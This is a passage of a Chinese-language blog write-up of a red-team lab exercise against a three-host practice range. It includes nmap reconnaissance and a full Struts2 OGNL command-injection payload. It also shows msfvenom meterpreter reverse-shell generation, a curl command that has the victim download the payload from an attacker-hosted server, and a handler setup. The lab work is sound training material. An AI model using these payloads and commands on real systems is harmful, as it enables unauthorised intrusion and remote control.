@@ -1,0 +1,892 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="简介开始时间 2024-2-19 15:23 环境搭建下载靶场下载地址：http:&#x2F;&#x2F;39.98.79.56&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;﻿ 共有三台主机DC、WEB、WIN7 密码主机密码  WEB主机 ubuntu:ubuntu WIN7主机 douser:Dotest123 (DC)WIN2008主机 administrator:Test2008  网络创建两个虚拟网卡  保证内网 发现保证">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RedSun04">
+<meta property="og:url" content="https://tsy244.github.io/2024/02/19/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun04/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="简介开始时间 2024-2-19 15:23 环境搭建下载靶场下载地址：http:&#x2F;&#x2F;39.98.79.56&#x2F;vuln&#x2F;detail&#x2F;6&#x2F;﻿ 共有三台主机DC、WEB、WIN7 密码主机密码  WEB主机 ubuntu:ubuntu WIN7主机 douser:Dotest123 (DC)WIN2008主机 administrator:Test2008  网络创建两个虚拟网卡  保证内网 发现保证">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219154516050.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155320775.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219154705801.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155100625.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155415865.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155540393.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160104534.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160547746.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160625449.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160631972.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160638589.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160851080.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219161152401.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219161444850.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219162922139.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163323136.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163701376.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163558551.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163759169.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163923255.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163950680.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163911105.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170413240.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170420744.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170803792.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170948862.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171121706.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171323455.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171403189.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219171429285.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220140917323.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220141315331.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220141649386.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220141838686.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220142002980.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220142402812.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220142415888.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220145946228.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220150104814.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220150657811.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220150812337.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220152825162.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240220154257905.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219173620934.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219173908310.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219174931042.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219175133036.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219175251544.png">
+<meta property="article:published_time" content="2024-02-19T07:23:34.000Z">
+<meta property="article:modified_time" content="2024-02-20T07:54:36.231Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="靶场记录">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219154516050.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>RedSun04 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="RedSun04"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-19 15:23" pubdate>
+          February 19, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">RedSun04</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>开始时间 2024-2-19 15:23</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://39.98.79.56/vuln/detail/6/﻿</a></p>
+<p>共有三台主机DC、WEB、WIN7</p>
+<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><p>主机密码</p>
+<blockquote>
+<p>WEB主机 ubuntu:ubuntu</p>
+<p>WIN7主机 douser:Dotest123</p>
+<p>(DC)WIN2008主机 administrator:Test2008</p>
+</blockquote>
+<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>创建两个虚拟网卡</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219154516050.png" srcset="/img/loading.gif" lazyload alt="image-20240219154516050"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155320775.png" srcset="/img/loading.gif" lazyload alt="image-20240219155320775">保证内网</p>
+<p>发现保证一个183 网卡就行了，还有一个是nat 网卡替代，模拟出网</p>
+<p>web</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219154705801.png" srcset="/img/loading.gif" lazyload alt="image-20240219154705801">win7 </p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155100625.png" srcset="/img/loading.gif" lazyload alt="image-20240219155100625"></p>
+<p>开启环境</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> docker start ec <span class="hljs-number">17</span> <span class="hljs-number">09</span> bb da <span class="hljs-number">3</span>d ab ad<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155415865.png" srcset="/img/loading.gif" lazyload alt="image-20240219155415865"></p>
+<p>winserver 2008</p>
+<p>由于登陆需要修改密码，就暂时不登录了</p>
+<p>win7</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219155540393.png" srcset="/img/loading.gif" lazyload alt="image-20240219155540393"></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><ol>
+<li><p>ip 查找</p>
+<p>使用nmap 做存活探测</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sP <span class="hljs-number">192.168.79.1</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160104534.png" srcset="/img/loading.gif" lazyload alt="image-20240219160104534"></p>
+<p>发现目标</p>
+</li>
+<li><p>端口扫描</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160547746.png" srcset="/img/loading.gif" lazyload alt="image-20240219160547746"></p>
+</li>
+<li><p>每一个端口访问</p>
+<p>2001</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160625449.png" srcset="/img/loading.gif" lazyload alt="image-20240219160625449"></p>
+<p>2002</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160631972.png" srcset="/img/loading.gif" lazyload alt="image-20240219160631972"></p>
+<p>2003</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160638589.png" srcset="/img/loading.gif" lazyload alt="image-20240219160638589"></p>
+</li>
+</ol>
+<h1 id="web-渗透"><a href="#web-渗透" class="headerlink" title="web 渗透"></a>web 渗透</h1><ol>
+<li><p>针对2001</p>
+<p>尝试抓包，没发现个什么东西</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219160851080.png" srcset="/img/loading.gif" lazyload alt="image-20240219160851080"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219161152401.png" srcset="/img/loading.gif" lazyload alt="image-20240219161152401"></p>
+<p>发现是s2 搭建的网站，尝试利用</p>
+<p>尝试工具利用</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219161444850.png" srcset="/img/loading.gif" lazyload alt="image-20240219161444850"></p>
+<p>发现存在漏洞</p>
+<p>上传webshell</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219162922139.png" srcset="/img/loading.gif" lazyload alt="image-20240219162922139"></p>
+<p>工具利用失败？</p>
+<p>尝试手动利用，该漏洞可以反弹shell </p>
+<p>等反弹shell 之后上传msf-payload </p>
+<blockquote>
+<p><a href="https://tsy244.github.io/2024/01/16/%E6%B8%97%E9%80%8F/Struts2/#strruts2-032">Struts2 - AU9U5T (tsy244.github.io)</a></p>
+</blockquote>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">Content-Type:<span class="hljs-string">&quot;%&#123;(<span class="hljs-subst">#nike</span>=&#x27;multipart/form-data&#x27;).(<span class="hljs-subst">#dm</span>=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(<span class="hljs-subst">#_memberAccess</span>?(<span class="hljs-subst">#_memberAccess</span>=<span class="hljs-subst">#dm</span>):((<span class="hljs-subst">#container</span>=<span class="hljs-subst">#context</span>[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(<span class="hljs-subst">#ognlUtil</span>=<span class="hljs-subst">#container</span>.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(<span class="hljs-subst">#ognlUtil</span>.getExcludedPackageNames().clear()).(<span class="hljs-subst">#ognlUtil</span>.getExcludedClasses().clear()).(<span class="hljs-subst">#context</span>.setMemberAccess(<span class="hljs-subst">#dm</span>)))).(<span class="hljs-subst">#cmd</span>=&#x27;whoami&#x27;).(<span class="hljs-subst">#iswin</span>=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(<span class="hljs-subst">#cmds</span>=(<span class="hljs-subst">#iswin</span>?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,<span class="hljs-subst">#cmd</span>&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,<span class="hljs-subst">#cmd</span>&#125;)).(<span class="hljs-subst">#p</span>=new java.lang.ProcessBuilder(<span class="hljs-subst">#cmds</span>)).(<span class="hljs-subst">#p</span>.redirectErrorStream(true)).(<span class="hljs-subst">#process</span>=<span class="hljs-subst">#p</span>.start()).(<span class="hljs-subst">#ros</span>=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(<span class="hljs-subst">#process</span>.getInputStream(),<span class="hljs-subst">#ros</span>)).(<span class="hljs-subst">#ros</span>.flush())&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163323136.png" srcset="/img/loading.gif" lazyload alt="image-20240219163323136"></p>
+<p>开启监听</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163701376.png" srcset="/img/loading.gif" lazyload alt="image-20240219163701376"></p>
+<p>反弹shell</p>
+<p>先将反弹shell 执行换一种形式，因为java 对一些字符有特殊意义</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163558551.png" srcset="/img/loading.gif" lazyload alt="image-20240219163558551"></p>
+<p>放入bp</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163759169.png" srcset="/img/loading.gif" lazyload alt="image-20240219163759169"></p>
+<p>没有发现命令</p>
+<p>那就换一个形式</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163923255.png" srcset="/img/loading.gif" lazyload alt="image-20240219163923255"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163950680.png" srcset="/img/loading.gif" lazyload alt="image-20240219163950680"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219163911105.png" srcset="/img/loading.gif" lazyload alt="image-20240219163911105"></p>
+<p>成功反弹</p>
+<p>生成payload </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">msfvenom</span> -p linux/x64/meterpreter/reverse_tcp -h <span class="hljs-number">192.168.79.138</span> -p <span class="hljs-number">20000</span> -f elf -o l_x64_revers_20000<br></code></pre></td></tr></table></figure>
+
+<p>开启http服务</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">python -m http.<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure>
+
+<p>访问下载</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl  http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">79.138</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/l_x64_revers_20000 -O /</span>tmp/test<br></code></pre></td></tr></table></figure>
+
+<p>攻击机开启handler</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">handler</span> -p linux/x64/meterpreter/reverse_tcp -H <span class="hljs-number">192.168.79.138</span> -P <span class="hljs-number">20000</span><br></code></pre></td></tr></table></figure>
+
+<p>受害者</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170413240.png" srcset="/img/loading.gif" lazyload alt="image-20240219170413240"></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240219170420744.png" srcset="/img/loading.gif" lazyload alt="image-20240219170420744"></p>
+<p>成功反弹</p>
+</li>
